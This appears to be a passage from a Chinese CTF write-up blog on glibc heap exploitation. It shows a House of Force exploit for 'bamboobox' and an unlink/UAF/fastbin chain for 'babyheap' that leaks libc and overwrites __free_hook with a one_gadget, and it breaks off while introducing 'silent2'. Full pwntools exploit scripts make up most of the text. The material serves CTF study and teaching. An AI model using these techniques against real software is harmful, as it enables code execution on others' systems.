class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the name of item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice:"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    sd(str(index))</span><br><span class="line">    ru(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    sd(str(size))</span><br><span class="line">    ru(<span class="string">"Please enter the new name of the item:"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"></span><br><span class="line">bk(<span class="number">0x0000000000400ADD</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">py1 = <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,py1)</span><br><span class="line">malloc(<span class="number">-160</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">0x20</span>, p64(magic)*<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>那么问题来了，如果没有这个堆溢出漏洞可以去构造出fake_chunk时，或者说malloc的大小固定时我们应该怎么办呢？这里介绍第二种方式：堆块的错位重叠（同样也是堆块里面创造堆块），这里要用到堆地址才能实现，所以得有puts函数打印出堆块上面的信息。</p>
<h4 id="看下网鼎杯的babyheap："><a href="#看下网鼎杯的babyheap：" class="headerlink" title="看下网鼎杯的babyheap："></a>看下网鼎杯的babyheap：</h4><p><img src="/blog_img/1563452990192.png" alt="1563452990192"></p>
<p>这里看到出了canary，其他的保护几乎全开，got表不可改？真的吗？错，__free_hook还是可以改写的，这是个知识点，要记牢固！</p>
<p>下面进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400882();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I thought this is really baby.What about u?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Loading....."</span>);</span><br><span class="line">  sleep(<span class="number">5u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4008E3();</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">        v3 = atoi(&amp;s);</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_400A79();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      sub_4009A0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400C01();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      sub_400B54();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是常规的菜单题，然后提取出各个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">malloc</span><span class="params">(index,Content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Choice:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(<span class="string">'1'</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Index:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(str(index))</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Content:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sd</span><span class="params">(Content)</span></span></span><br><span class="line"><span class="function">def <span class="title">free</span><span class="params">(Index)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Choice:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(<span class="string">'4'</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Index:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(str(Index))</span></span></span><br><span class="line"><span class="function">def <span class="title">puts</span><span class="params">(Index)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Choice:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(<span class="string">'3'</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Index:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(str(Index))</span></span></span><br><span class="line"><span class="function">def <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Choice:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(<span class="string">'5'</span>)</span></span></span><br><span class="line"><span class="function">def <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Choice:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(<span class="string">'2'</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Index:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sl</span><span class="params">(str(index))</span></span></span><br><span class="line"><span class="function">    <span class="title">ru</span><span class="params">(<span class="string">"Content:"</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">sd</span><span class="params">(Content)</span></span></span><br></pre></td></tr></table></figure>

<p>这里需要注意几点，首先只能申请10个堆块，然后只能编辑3次，那么问题来了，该怎么做呢？</p>
<p>第一步先泄露出堆的基地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="string">'aaaaaaaa\n'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'bbbbbbbb\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(rc(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr---&gt;"</span> + hex(heap_addr)</span><br></pre></td></tr></table></figure>

<p>free完了，我们在bins中得到了2个chunk块。这里free的顺序需要特别注意，因为第一个申请的一般低位是0会有截断，我试过，泄露不出地址。所以先free掉chunk1再free掉chunk0，这样chunk0指向chunk1，得到chunk1的地址，进一步得到堆块的基地址。</p>
<p>拿到了堆块的基地址，可以构造fakechunk了，这里我们用堆块错位法，编辑下：</p>
<p><img src="/blog_img/1563453622646.png" alt="1563453622646"></p>
<p>在chunk0的fd位置填写0x113d020，bk填写0，然后data那里填写0和0x31，那么fd指向chunk0自身的0x113d020位置处，bins中也可见：</p>
<p><img src="/blog_img/1563453871703.png" alt="1563453871703"></p>
<p>接着我们申请新的块就会造成堆块的重叠错位，要知道0x113d030处正好有我们的chunk1的大小0x30，如果我们成功控制了0x113d020的堆块，就可以下溢修改chunk1的大小了，改成大于fastbins的chunk，使得后面free时可以得到main_arena的地址，说干就干。</p>
<p><img src="/blog_img/1563454186309.png" alt="1563454186309"></p>
<p>成功了，看到chunk1的大小变成了0xa0，而且转态是free的，但是我们得继续申请才有这么多的空间（实际上还是0x20的大小），我们接着申请2个垃圾堆块（0x60，纯属为了free时给空间）,再申请一个chunk4，chunk4的presize和size还是属于我们的fake_chunk的。0x30+0x60+0x10 = 0xa0，刚好，下面我们对chunk4进行精心的构造，造出第二个fake_chunk来，好实现unlink操作~</p>
<p><img src="/blog_img/1563454744150.png" alt="1563454744150"></p>
<p>0x113d0d0那里有0和0x30，gdb没有显示而已，是我们的fake_chunk的presize和size，然后全局变量我们选取的是chunk1的地址指针（0x602068）+24的位置即0x602080（chunk4的指针地址），fd和bk就构造出来了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FD = <span class="number">0x602080</span><span class="number">-24</span></span><br><span class="line">BK = <span class="number">0x602080</span><span class="number">-16</span></span><br><span class="line">py2 = <span class="string">''</span></span><br><span class="line">py2 += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">py2 += p64(FD) + p64(BK)</span><br><span class="line">malloc(<span class="number">4</span>,py2)</span><br><span class="line">py3 = <span class="string">''</span></span><br><span class="line">py3 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">'\n'</span></span><br><span class="line">malloc(<span class="number">5</span>,py3)</span><br></pre></td></tr></table></figure>

<p>最终unlink出来，0x602080指向0x602068的位置，也就是说chunk4指向chunk1，那么编辑chunk4，就会往chunk1写入free_hook真实地址，接着再编辑chunk1一次，往free_hook地址上写入onegadget即可getshell~</p>
<p><img src="/blog_img/1563455472895.png" alt="1563455472895"></p>
<p>这是unlink后的chunk块，可以发现是向前合并的类型，0xa0+0x30=0xd0，同时放入了unsortedbin中，那么我们直接可以打印出main_arena的地址，从而得到基地址和onegadget，接着编辑即可，上完整的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Choice:"</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Index:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Content:"</span>)</span><br><span class="line">    sd(Content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(Index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Choice:"</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index:"</span>)</span><br><span class="line">    sl(str(Index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(Index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Choice:"</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index:"</span>)</span><br><span class="line">    sl(str(Index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Choice:"</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Choice:"</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Index:"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Content:"</span>)</span><br><span class="line">    sd(Content)</span><br><span class="line">bk(<span class="number">0x400A56</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">'aaaaaaaa\n'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'bbbbbbbb\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(rc(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr---&gt;"</span> + hex(heap_addr)</span><br><span class="line">py1 = p64(heap_addr+<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">py1 += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">edit(<span class="number">0</span>,py1)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">6</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">malloc(<span class="number">7</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">'cccccccc\n'</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'dddddddd\n'</span>)</span><br><span class="line"></span><br><span class="line">FD = <span class="number">0x602080</span><span class="number">-24</span></span><br><span class="line">BK = <span class="number">0x602080</span><span class="number">-16</span></span><br><span class="line">py2 = <span class="string">''</span></span><br><span class="line">py2 += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">py2 += p64(FD) + p64(BK)</span><br><span class="line">malloc(<span class="number">4</span>,py2)</span><br><span class="line">py3 = <span class="string">''</span></span><br><span class="line">py3 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">'\n'</span></span><br><span class="line">malloc(<span class="number">5</span>,py3)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_arena---&gt;"</span> + hex(main_arena)</span><br><span class="line">libc_base = (main_arena&amp;<span class="number">0xfffffffff000</span>) - <span class="number">0x3c4000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libcbase---&gt;'</span> + hex(libc_base)</span><br><span class="line"><span class="comment"># malloc_hook = main_arena - 0x10</span></span><br><span class="line"><span class="comment"># libc_base1 = malloc_hook - libc.symbols["__malloc_hook"]</span></span><br><span class="line"><span class="comment"># print 'libc_base1---&gt;' + hex(libc_base1)</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_hook---&gt;"</span> + hex(free_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"onegadget---&gt;"</span> + hex(onegadget)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(onegadget) + <span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">2</span>) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>调试可以看到信息：</p>
<p><img src="/blog_img/1563455836253.png" alt="1563455836253"></p>
<p><img src="/blog_img/1563455916281.png" alt="1563455916281"></p>
<p>接着随便free掉一个块即可getshell~</p>
<p><img src="/blog_img/1563455947360.png" alt="1563455947360"></p>
<p>这里总结如下：</p>
<h4 id="首先题型是固定malloc大小，然后不能实现堆溢出，可以通过泄露出堆地址来实现chunk的错位从而间接改写chunk大小为大于fastbin的大小，并通过不断申请新的chunk来加需要的空间，最后构造一个free的chunk来实现unlink（向前合并），再构造一个chunk来使得前面的chunk位free状态，最后free掉一开始的chunk块，既可实现双重功能：泄露libc和任意地址写-用到的知识点是unlink-UAF-fastbin-attack"><a href="#首先题型是固定malloc大小，然后不能实现堆溢出，可以通过泄露出堆地址来实现chunk的错位从而间接改写chunk大小为大于fastbin的大小，并通过不断申请新的chunk来加需要的空间，最后构造一个free的chunk来实现unlink（向前合并），再构造一个chunk来使得前面的chunk位free状态，最后free掉一开始的chunk块，既可实现双重功能：泄露libc和任意地址写-用到的知识点是unlink-UAF-fastbin-attack" class="headerlink" title="首先题型是固定malloc大小，然后不能实现堆溢出，可以通过泄露出堆地址来实现chunk的错位从而间接改写chunk大小为大于fastbin的大小，并通过不断申请新的chunk来加需要的空间，最后构造一个free的chunk来实现unlink（向前合并），再构造一个chunk来使得前面的chunk位free状态，最后free掉一开始的chunk块，既可实现双重功能：泄露libc和任意地址写~用到的知识点是unlink+UAF+fastbin_attack"></a>首先题型是固定malloc大小，然后不能实现堆溢出，可以通过泄露出堆地址来实现chunk的错位从而间接改写chunk大小为大于fastbin的大小，并通过不断申请新的chunk来加需要的空间，最后构造一个free的chunk来实现unlink（向前合并），再构造一个chunk来使得前面的chunk位free状态，最后free掉一开始的chunk块，既可实现双重功能：泄露libc和任意地址写~用到的知识点是unlink+UAF+fastbin_attack</h4><p>那就再来一道简单题：</p>
<h4 id="2018年强网杯silent2："><a href="#2018年强网杯silent2：" class="headerlink" title="2018年强网杯silent2："></a>2018年强网杯silent2：</h4><p><img src="/blog_img/1563464958537.png" alt="1563464958537"></p>
<p>分析代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+<span class="number">4</span>h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v4; // [rsp+<span class="number">8</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40091C(a1, a2, a3);</span><br><span class="line">  sub_4009A4();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    getchar();</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case <span class="number">2</span>:</span><br><span class="line">        sub_400AB7();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">3</span>:</span><br><span class="line">        